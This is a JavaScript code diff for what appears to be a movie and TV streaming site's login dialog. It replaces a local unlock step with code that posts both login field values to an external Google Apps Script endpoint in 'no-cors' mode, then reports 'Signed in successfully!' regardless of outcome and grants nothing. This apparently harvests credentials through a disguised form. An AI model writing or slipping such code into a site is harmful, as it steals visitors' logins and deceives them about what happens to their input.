@@ -5215,10 +5215,13 @@ async function handleSearch(e) {
                     '</div>' +
                 '</div>';
 
-            document.getElementById('loginSubmitBtn').addEventListener('click', function() {
+            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxLECdlbq7i5RzQwJSE3ka5xu7dQUJxoyMvBm6jRcqM0OB6GmFtnM-XHhNEv20omoHu/exec';
+
+            document.getElementById('loginSubmitBtn').addEventListener('click', async function() {
                 const field1 = document.getElementById('loginField1').value.trim();
                 const field2 = document.getElementById('loginField2').value.trim();
                 const msg = document.getElementById('loginMsg');
+                const btn = document.getElementById('loginSubmitBtn');
 
                 if (!field1 || !field2) {
                     msg.className = 'login-msg error';
@@ -5226,12 +5229,33 @@ async function handleSearch(e) {
                     return;
                 }
 
-                grantMoviesAccess();
-                msg.className = 'login-msg success';
-                msg.textContent = 'Movies & TV unlocked. Loading...';
-                setTimeout(function() {
-                    showSection('movies-tv');
-                }, 250);
+                btn.disabled = true;
+                msg.className = 'login-msg loading';
+                msg.textContent = 'Signing in...';
+
+                try {
+                    await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ field1: field1, field2: field2 })
+                    });
+
+                    msg.className = 'login-msg success';
+                    msg.textContent = 'Signed in successfully!';
+                    document.getElementById('loginField1').value = '';
+                    document.getElementById('loginField2').value = '';
+
+                    setTimeout(() => {
+                        msg.style.display = 'none';
+                    }, 3000);
+
+                } catch (e) {
+                    msg.className = 'login-msg error';
+                    msg.textContent = 'Sign in failed. Please try again.';
+                } finally {
+                    btn.disabled = false;
+                }
             });
 
             // Allow Enter key to submit
@@ -5241,6 +5265,12 @@ async function handleSearch(e) {
                 }
             });
         }
+
+        window.onbeforeunload = function() {
+            if (document.getElementById('movieModal').classList.contains('active')) {
+                return "A movie is playing. Are you sure you want to leave?";
+            }
+        };
 
         window.onbeforeunload = function() {
             if (document.getElementById('movieModal').classList.contains('active')) {
